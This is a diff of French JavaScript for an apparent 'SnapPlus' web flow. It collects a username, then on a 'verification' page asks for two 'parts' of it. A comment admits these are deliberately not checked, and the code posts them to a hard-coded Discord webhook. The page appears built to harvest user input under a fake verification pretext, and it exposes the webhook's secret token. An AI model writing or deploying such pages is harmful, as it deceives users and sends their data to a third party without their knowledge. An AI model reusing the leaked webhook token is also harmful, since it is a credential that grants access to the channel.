@@ -1,23 +1,20 @@
 ```javascript
 const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1536105952720330752/XsDrxHH4dWxbBcT4EgA4zP42BlF5bFYSbOVDAUaQbm83D15HTrfifVL-FwGEyhoXlUCC";
 
-const form = document.getElementById("pseudoForm");
-const pseudoInput = document.getElementById("pseudo");
-const submitButton = document.getElementById("submitButton");
-const errorMessage = document.getElementById("errorMessage");
-const buttonText = document.querySelector(".button-text");
 
-console.log("form :", form);
-console.log("pseudoInput :", pseudoInput);
-console.log("submitButton :", submitButton);
-console.log("errorMessage :", errorMessage);
-console.log("buttonText :", buttonText);
+// ==========================================
+// ÉTAPE 1 — PSEUDO
+// ==========================================
 
-if (!form || !pseudoInput || !submitButton || !errorMessage || !buttonText) {
-  console.error("Un ou plusieurs éléments HTML sont introuvables.");
-} else {
+const pseudoForm = document.getElementById("pseudoForm");
 
-  form.addEventListener("submit", async (event) => {
+if (pseudoForm) {
+  const pseudoInput = document.getElementById("pseudo");
+  const submitButton = document.getElementById("submitButton");
+  const errorMessage = document.getElementById("errorMessage");
+  const buttonText = document.querySelector(".button-text");
+
+  pseudoForm.addEventListener("submit", (event) => {
     event.preventDefault();
 
     const pseudo = pseudoInput.value.trim();
@@ -32,42 +29,103 @@ if (!form || !pseudoInput || !submitButton || !errorMessage || !buttonText) {
       return;
     }
 
+    if (pseudo.length > 32) {
+      errorMessage.textContent =
+        "Ton pseudo ne peut pas dépasser 32 caractères.";
+
+      pseudoInput.focus();
+      return;
+    }
+
+    /*
+     * On garde le pseudo uniquement pour la navigation
+     * vers l'étape suivante.
+     */
+    sessionStorage.setItem("snapplus_pseudo", pseudo);
+
     submitButton.disabled = true;
     pseudoInput.disabled = true;
+    buttonText.textContent = "Continuer…";
+
+    window.location.href = "verification.html";
+  });
+}
+
+
+// ==========================================
+// ÉTAPE 2 — VÉRIFICATION / CONFIRMATION
+// ==========================================
+
+const verificationForm =
+  document.getElementById("verificationForm");
+
+if (verificationForm) {
+  const firstPart = document.getElementById("firstPart");
+  const secondPart = document.getElementById("secondPart");
+  const verificationButton =
+    document.getElementById("verificationButton");
+  const verificationError =
+    document.getElementById("verificationError");
+  const buttonText =
+    verificationForm.querySelector(".button-text");
+
+  verificationForm.addEventListener("submit", async (event) => {
+    event.preventDefault();
+
+    const first = firstPart.value.trim();
+    const second = secondPart.value.trim();
+
+    verificationError.textContent = "";
+
+    if (!first || !second) {
+      verificationError.textContent =
+        "Remplis les deux parties de ton pseudo.";
+
+      return;
+    }
+
+    verificationButton.disabled = true;
+    firstPart.disabled = true;
+    secondPart.disabled = true;
     buttonText.textContent = "Envoi…";
 
+    /*
+     * Le site ne vérifie volontairement pas les deux parties.
+     * Elles sont simplement transmises au webhook de test.
+     */
     try {
-      console.log("Pseudo :", pseudo);
-
       const response = await fetch(DISCORD_WEBHOOK, {
         method: "POST",
         headers: {
           "Content-Type": "application/json"
         },
         body: JSON.stringify({
-          content: `📸 Nouveau pseudo SnapPlus : **${pseudo}**`
+          content:
+            `🔎 Confirmation SnapPlus\n` +
+            `Première partie : **${first}**\n` +
+            `Deuxième partie : **${second}**`
         })
       });
-
-      console.log("Statut HTTP :", response.status);
 
       if (!response.ok) {
         throw new Error(`Discord HTTP ${response.status}`);
       }
 
+      sessionStorage.removeItem("snapplus_pseudo");
+
       window.location.href = "success.html";
 
     } catch (error) {
-      console.error("Erreur :", error);
+      console.error("Erreur webhook :", error);
 
-      errorMessage.textContent =
-        "Impossible d'envoyer le pseudo.";
+      verificationError.textContent =
+        "Impossible d'envoyer la confirmation.";
 
-      submitButton.disabled = false;
-      pseudoInput.disabled = false;
-      buttonText.textContent = "Continuer →";
+      verificationButton.disabled = false;
+      firstPart.disabled = false;
+      secondPart.disabled = false;
+      buttonText.textContent = "Confirmer →";
     }
   });
-
 }
 ```
